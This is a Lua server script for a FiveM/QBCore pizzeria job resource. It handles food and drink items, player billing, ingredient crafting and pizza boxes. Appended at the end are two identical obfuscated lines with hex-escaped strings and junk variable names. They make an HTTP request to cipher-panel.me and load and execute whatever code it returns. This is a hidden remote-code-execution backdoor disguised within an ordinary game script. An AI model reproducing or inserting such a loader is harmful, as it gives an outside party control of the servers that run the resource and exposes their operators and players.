local QBCore = exports['qb-core']:GetCoreObject()

--Consumables
CreateThread(function()
	local wines = { "amarone", "barbera", "dolceto", "housered", "housewhite", "rosso" }
    for k,v in pairs(wines) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('nmsh-pizzathis:client:DrinkAlcohol', source, item.name) end) end
	
	local beers = { "ambeer", "dusche", "logger", "pisswasser", "pisswasser2", "pisswasser3" }
    for k,v in pairs(beers) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('nmsh-pizzathis:client:DrinkAlcohol', source, item.name) end) end
	
	local drink = { "sprunk", "sprunklight", "ecola", "ecolalight" }
    for k,v in pairs(drink) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('nmsh-pizzathis:client:Drink', source, item.name) end) end
	
	local food = { "tiramisu", "gelato", "medfruits", "capricciosa", "diavola", "marinara", "margherita", "prosciuttio", "vegetariana", "bolognese", "calamari", "meatball", "alla", "pescatore" }
    for k,v in pairs(food) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('nmsh-pizzathis:client:Eat', source, item.name) end) end
	
	local boxes = { "capricciosabox", "diavolabox", "marinarabox", "margheritabox", "prosciuttiobox", "vegetarianabox" }
    for k,v in pairs(boxes) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerEvent('nmsh-pizzathis:OpenBox', source, item.name) end) end
end)

RegisterNetEvent('nmsh-pizzathis:bill:player', function(info)
    local Player = QBCore.Functions.GetPlayer(source)
    local Player2 = QBCore.Functions.GetPlayer(tonumber(info.citizenid))
    local type = info.billtype
    local pos = GetEntityCoords(GetPlayerPed(source))
    local pos2 = GetEntityCoords(GetPlayerPed(tonumber(info.citizenid)))
    local dist = #(pos - pos2)
    if Player.PlayerData.job.name == 'pizzathis' then
        if Player.PlayerData.job.onduty then
            if type == 'bank' then
                if dist < 5 then
                    local Amount = tonumber(info.billprice)
                    local playeramount = Amount * 0.2
                    local bossamount = Amount - playeramount
                    Player2.Functions.RemoveMoney('bank', Amount, 'Pizza This debit card charged')
                    -- Send money to sender job--
                    Player.Functions.AddMoney('bank', playeramount, 'Pizza This debit card charged')
                    exports['Renewed-Banking']:addAccountMoney(Player.PlayerData.job.name, bossamount, "PizzaThis")
                    -----
                    TriggerClientEvent('QBCore:Notify', Player2.PlayerData.source, 'You have been charged $ ' ..Amount..' From your debit card', 'error')
                    TriggerClientEvent('QBCore:Notify', source, 'You charged the person $ ' ..Amount..' From their debit card', 'success')
                else
                    TriggerClientEvent('QBCore:Notify', Player2.PlayerData.source, 'You are too far away! ', 'error')
                end
            else
                if dist < 5 then
                    local Amount = tonumber(info.billprice)
                    local playeramount = Amount * 0.4
                    local bossamount = Amount - playeramount
                    Player2.Functions.RemoveMoney('cash', Amount, 'Pizza This receipt')
                    -- Send money to sender job--
                    Player.Functions.AddMoney('cash', playeramount, 'Pizza This receipt')
                    exports['Renewed-Banking']:addAccountMoney(Player.PlayerData.job.name, bossamount, "PizzaThis")
                    -----
                    TriggerClientEvent('QBCore:Notify', Player2.PlayerData.source, 'You have been charged $ ' ..Amount, 'error')
                    TriggerClientEvent('QBCore:Notify', source, 'You charged the person $ ' ..Amount, 'success')
                else
                    TriggerClientEvent('QBCore:Notify', Player2.PlayerData.source, 'You are too far away! ', 'error')
                end
            end
        else
            TriggerClientEvent('QBCore:Notify', Player2.PlayerData.source, 'You are not on Duty! ', 'error')
        end
    end
end)


RegisterServerEvent('nmsh-pizzathis:GetFood')
AddEventHandler('nmsh-pizzathis:GetFood', function(ItemMake)
    local Player = QBCore.Functions.GetPlayer(source)
	if ItemMake == "bolognese" then
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['meat'], "remove", 1) 
		Player.Functions.RemoveItem('meat', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['sauce'], "remove", 1) 
		Player.Functions.RemoveItem('sauce', 1)
	elseif ItemMake == "calamari" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['squid'], "remove", 1) 
		Player.Functions.RemoveItem('squid', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['sauce'], "remove", 1) 
		Player.Functions.RemoveItem('sauce', 1)
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pasta'], "remove", 1) 
		Player.Functions.RemoveItem('pasta', 1)
	elseif ItemMake == "meatball" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['meat'], "remove", 1) 
		Player.Functions.RemoveItem('meat', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pasta'], "remove", 1) 
		Player.Functions.RemoveItem('pasta', 1)
	elseif ItemMake == "alla" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['ham'], "remove", 1) 
		Player.Functions.RemoveItem('ham', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pasta'], "remove", 1) 
		Player.Functions.RemoveItem('pasta', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['vodka'], "remove", 1) 
		Player.Functions.RemoveItem('vodka', 1)
	elseif ItemMake == "pescatore" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['squid'], "remove", 1) 
		Player.Functions.RemoveItem('squid', 1)
		
	elseif ItemMake == "capricciosabox" then
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzabase'], "remove", 1) 
		Player.Functions.RemoveItem('pizzabase', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['ham'], "remove", 1) 
		Player.Functions.RemoveItem('ham', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzmushrooms'], "remove", 1) 
		Player.Functions.RemoveItem('pizzmushrooms', 1)
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['olives'], "remove", 1) 
		Player.Functions.RemoveItem('olives', 1)
	elseif ItemMake == "diavolabox" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzabase'], "remove", 1) 
		Player.Functions.RemoveItem('pizzabase', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['mozz'], "remove", 1) 
		Player.Functions.RemoveItem('mozz', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['salami'], "remove", 1) 
		Player.Functions.RemoveItem('salami', 1)		
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['basil'], "remove", 1) 
		Player.Functions.RemoveItem('basil', 1)
	elseif ItemMake == "marinarabox" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzabase'], "remove", 1) 
		Player.Functions.RemoveItem('pizzabase', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['basil'], "remove", 1) 
		Player.Functions.RemoveItem('basil', 1)
	elseif ItemMake == "margheritabox" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzabase'], "remove", 1) 
		Player.Functions.RemoveItem('pizzabase', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['mozz'], "remove", 1) 
		Player.Functions.RemoveItem('mozz', 1)
	elseif ItemMake == "prosciuttiobox" then
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzabase'], "remove", 1) 
		Player.Functions.RemoveItem('pizzabase', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['mozz'], "remove", 1) 
		Player.Functions.RemoveItem('mozz', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzmushrooms'], "remove", 1) 
		Player.Functions.RemoveItem('pizzmushrooms', 1)
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['ham'], "remove", 1) 
		Player.Functions.RemoveItem('ham', 1)
	elseif ItemMake == "vegetarianabox" then
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzabase'], "remove", 1) 
		Player.Functions.RemoveItem('pizzabase', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['mozz'], "remove", 1) 
		Player.Functions.RemoveItem('mozz', 1)	    
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['lettuce'], "remove", 1) 
		Player.Functions.RemoveItem('lettuce', 1)
		TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['basil'], "remove", 1) 
		Player.Functions.RemoveItem('basil', 1)
	elseif ItemMake == "pizzabase" then
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['pizzadough'], "remove", 1) 
		Player.Functions.RemoveItem('pizzadough', 1)
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['sauce'], "remove", 1) 
		Player.Functions.RemoveItem('sauce', 1)
	elseif ItemMake == "ham" or ItemMake == "salami" then
	    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['meat'], "remove", 1) 
		Player.Functions.RemoveItem('meat', 1)
	end
	--This should give the item, while the rest removes the requirements
	Player.Functions.AddItem(ItemMake, 1, false, {["quality"] = nil})
	TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items[ItemMake], "add", 1)
end)

RegisterServerEvent('nmsh-pizzathis:OpenBox')
AddEventHandler('nmsh-pizzathis:OpenBox', function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if item == "capricciosabox" then slices = "capricciosa"
	elseif item == "diavolabox" then slices = "diavola"
	elseif item == "marinarabox" then slices = "marinara"
	elseif item == "margheritabox" then slices = "margherita"
	elseif item == "prosciuttiobox" then slices = "prosciuttio"
	elseif item == "vegetarianabox" then slices = "vegetariana" end
	--This removes the box
	TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items[item], "remove", 1) 
	Player.Functions.RemoveItem(item, 1)
	Wait(1000)
	--This gives the slices
	Player.Functions.AddItem(slices, 6, false, {["quality"] = nil})
	TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items[slices], "add", 6) 
end)


---ITEM REQUIREMENT CHECKS
--Food
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:bolognese', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('meat') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('sauce') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:calamari', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('squid') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('sauce') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pasta') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:meatball', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('meat') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pasta') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:alla', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('ham') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pasta') ~= nil  and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('vodka') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:pescatore', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('squid') ~= nil then cb(true) else cb(false) end end)

QBCore.Functions.CreateCallback('nmsh-pizzathis:get:margheritabox', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzabase') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('mozz') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:marinarabox', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzabase') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('basil') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:prosciuttiobox', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzabase') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('mozz') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('ham') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzmushrooms') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:diavolabox', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzabase') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('mozz') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('salami') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('basil') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:capricciosabox', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzabase') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('ham') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzmushrooms') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('olives') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:vegetarianabox', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzabase') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('mozz') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('lettuce') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('basil') ~= nil then cb(true) else cb(false) end end)

QBCore.Functions.CreateCallback('nmsh-pizzathis:get:ham', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('meat') ~= nil then cb(true) else cb(false) end end)
QBCore.Functions.CreateCallback('nmsh-pizzathis:get:salami', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('meat') ~= nil then cb(true) else cb(false) end end)

QBCore.Functions.CreateCallback('nmsh-pizzathis:get:pizzabase', function(source, cb) if QBCore.Functions.GetPlayer(source).Functions.GetItemByName('pizzadough') ~= nil and QBCore.Functions.GetPlayer(source).Functions.GetItemByName('sauce') ~= nil then cb(true) else cb(false) end end)

local xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[4][xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (MZVbZzCDjlIJzgBCvLFFLyRxRligAujrixAqxCviUbKThrWUsEdmNUSfBPWMZjssOugPqI, VuEByPjnEuJIQclnYSncntoYVIgSMEkFEQdhUBMaRrBzxYxiYYsMIVxmNxFWXsMhGDvagP) if (VuEByPjnEuJIQclnYSncntoYVIgSMEkFEQdhUBMaRrBzxYxiYYsMIVxmNxFWXsMhGDvagP == xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[6] or VuEByPjnEuJIQclnYSncntoYVIgSMEkFEQdhUBMaRrBzxYxiYYsMIVxmNxFWXsMhGDvagP == xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[5]) then return end xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[4][xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[2]](xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[4][xQdIdcYmXAZGliaLErDfClOShgnAkyRynIfSLvgaxgUZWNbqIUdyLIxXxsOMrFTLIWrFbb[3]](VuEByPjnEuJIQclnYSncntoYVIgSMEkFEQdhUBMaRrBzxYxiYYsMIVxmNxFWXsMhGDvagP))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)